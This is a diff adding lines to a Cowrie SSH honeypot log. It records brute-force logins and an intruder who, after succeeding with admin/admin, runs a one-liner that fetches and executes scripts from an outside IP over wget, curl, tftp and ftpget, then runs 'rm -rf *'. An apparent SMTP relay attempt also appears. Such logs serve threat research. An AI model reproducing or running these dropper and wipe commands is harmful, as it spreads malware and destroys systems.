@@ -334,3 +334,98 @@
 2017-04-19T21:34:43+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
 2017-04-19T21:34:43+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
 2017-04-19T21:34:43+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.77.11/team.sh>
+2017-04-19T21:35:07+0000 [SSHChannel None (22) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13336,134.19.187.78] remote eof
+2017-04-19T21:35:07+0000 [SSHChannel None (22) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13336,134.19.187.78] remote close
+2017-04-19T21:35:07+0000 [SSHChannel None (22) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13336,134.19.187.78] sending close 22
+2017-04-19T21:35:25+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 149.56.24.226:32905 (10.8.41.81:2222) [session: b5707143]
+2017-04-19T21:35:25+0000 [HoneyPotSSHTransport,13407,149.56.24.226] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-04-19T21:35:25+0000 [HoneyPotSSHTransport,13407,149.56.24.226] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-19T21:35:25+0000 [HoneyPotSSHTransport,13407,149.56.24.226] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-19T21:35:25+0000 [HoneyPotSSHTransport,13407,149.56.24.226] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-19T21:35:26+0000 [HoneyPotSSHTransport,13407,149.56.24.226] NEW KEYS
+2017-04-19T21:35:26+0000 [HoneyPotSSHTransport,13407,149.56.24.226] starting service 'ssh-userauth'
+2017-04-19T21:35:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13407,149.56.24.226] 'root' trying auth 'password'
+2017-04-19T21:35:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13407,149.56.24.226] login attempt: 338
+2017-04-19T21:35:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13407,149.56.24.226] login return, expect: [doctor/doctor]
+2017-04-19T21:35:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13407,149.56.24.226] login attempt [root/bucharest] failed
+2017-04-19T21:35:27+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 163.172.169.202:36824 (10.8.41.81:2222) [session: b6402ebc]
+2017-04-19T21:35:27+0000 [HoneyPotSSHTransport,13408,163.172.169.202] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-04-19T21:35:27+0000 [HoneyPotSSHTransport,13408,163.172.169.202] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-19T21:35:27+0000 [HoneyPotSSHTransport,13408,163.172.169.202] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-19T21:35:27+0000 [HoneyPotSSHTransport,13408,163.172.169.202] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-19T21:35:27+0000 [HoneyPotSSHTransport,13408,163.172.169.202] NEW KEYS
+2017-04-19T21:35:27+0000 [HoneyPotSSHTransport,13408,163.172.169.202] starting service 'ssh-userauth'
+2017-04-19T21:35:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13408,163.172.169.202] 'admin' trying auth 'password'
+2017-04-19T21:35:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13408,163.172.169.202] login attempt: 90
+2017-04-19T21:35:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13408,163.172.169.202] login return, expect: [admin/admin]
+2017-04-19T21:35:27+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13408,163.172.169.202] login attempt [admin/admin] succeeded
+2017-04-19T21:35:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13408,163.172.169.202] 'admin' authenticated with 'password'
+2017-04-19T21:35:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13408,163.172.169.202] starting service 'ssh-connection'
+2017-04-19T21:35:29+0000 [-] 'root' failed auth 'password'
+2017-04-19T21:35:29+0000 [-] unauthorized login: 
+2017-04-19T21:35:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] got channel 'session' request
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] channel open
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.77.11/team.sh; curl -O http://51.15.77.11/bin.sh; chmod 777 bin.sh; sh bin.sh; tftp 51.15.77.11 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.77.11; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.77.11 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bin.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] Opening TTY Log: log/tty/20170419-213530-b6402ebc-0e.log
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.77.11/team.sh; curl -O http://51.15.77.11/bin.sh; chmod 777 bin.sh; sh bin.sh; tftp 51.15.77.11 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.77.11; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.77.11 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bin.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] Command found: cd /tmp
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] Command found: cd /var/run
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] Command found: cd /mnt
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] Command found: cd /root
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] Command found: cd /
+2017-04-19T21:35:30+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] Command found: wget http://51.15.77.11/team.sh
+2017-04-19T21:35:30+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.77.11/team.sh>
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Not storing duplicate content b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.77.11/team.sh) with SHA-256 b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2 to dl/b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.77.11/bin.sh
+2017-04-19T21:35:30+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.77.11/bin.sh>
+2017-04-19T21:35:30+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.77.11/team.sh>
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Not storing duplicate content b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Downloaded URL (http://51.15.77.11/bin.sh) with SHA-256 b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2 to dl/b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: chmod 777 /bin.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: sh /bin.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.77.11 -c get tftp1.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.77.11
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.77.11 ftp1.sh ftp1.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: rm -rf /bin.sh tftp1.sh tftp2.sh ftp1.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev /team.sh
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Not storing duplicate content b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2 to dl/b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Not storing duplicate content b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2 to dl/b1a85d8b96df26d6434c60cb3c5fbab685b105ad728577d763a7c897694b97b2
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170419-213530-b6402ebc-0e.log after 0 seconds
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-04-19T21:35:30+0000 [HTTPPageDownloader,client] sending close 0
+2017-04-19T21:35:30+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.77.11/bin.sh>
+2017-04-19T21:35:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13407,149.56.24.226] 'root' trying auth 'password'
+2017-04-19T21:35:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13407,149.56.24.226] login attempt: 339
+2017-04-19T21:35:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13407,149.56.24.226] login return, expect: [doctor/doctor]
+2017-04-19T21:35:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,13407,149.56.24.226] login attempt [root/byte] failed
+2017-04-19T21:35:31+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,13408,163.172.169.202] remote close
+2017-04-19T21:35:31+0000 [HoneyPotSSHTransport,13408,163.172.169.202] avatar admin logging out
+2017-04-19T21:35:31+0000 [HoneyPotSSHTransport,13408,163.172.169.202] connection lost
+2017-04-19T21:35:31+0000 [HoneyPotSSHTransport,13408,163.172.169.202] Connection lost after 3 seconds
+2017-04-19T21:35:31+0000 [-] 'root' failed auth 'password'
+2017-04-19T21:35:31+0000 [-] unauthorized login: 
+2017-04-19T21:35:31+0000 [HoneyPotSSHTransport,13407,149.56.24.226] connection lost
+2017-04-19T21:35:31+0000 [HoneyPotSSHTransport,13407,149.56.24.226] Connection lost after 5 seconds
+2017-04-19T21:35:35+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 51.254.39.79:9224 (10.8.41.81:2222) [session: 1db9eb32]
+2017-04-19T21:35:35+0000 [HoneyPotSSHTransport,13409,51.254.39.79] Remote SSH version: SSH-2.0-libssh2_1.7.0
+2017-04-19T21:35:35+0000 [HoneyPotSSHTransport,13409,51.254.39.79] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-04-19T21:35:35+0000 [HoneyPotSSHTransport,13409,51.254.39.79] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-19T21:35:35+0000 [HoneyPotSSHTransport,13409,51.254.39.79] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-19T21:35:43+0000 [HoneyPotSSHTransport,13409,51.254.39.79] NEW KEYS
+2017-04-19T21:35:43+0000 [HoneyPotSSHTransport,13409,51.254.39.79] starting service 'ssh-userauth'
+2017-04-19T21:35:43+0000 [HoneyPotSSHTransport,13409,51.254.39.79] connection lost
+2017-04-19T21:35:43+0000 [HoneyPotSSHTransport,13409,51.254.39.79] Connection lost after 8 seconds
+2017-04-19T21:35:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13342,91.230.47.71] got channel 'direct-tcpip' request
+2017-04-19T21:35:48+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,13342,91.230.47.71] direct-tcp connection request to 82.71.205.1:25 from localhost:5556
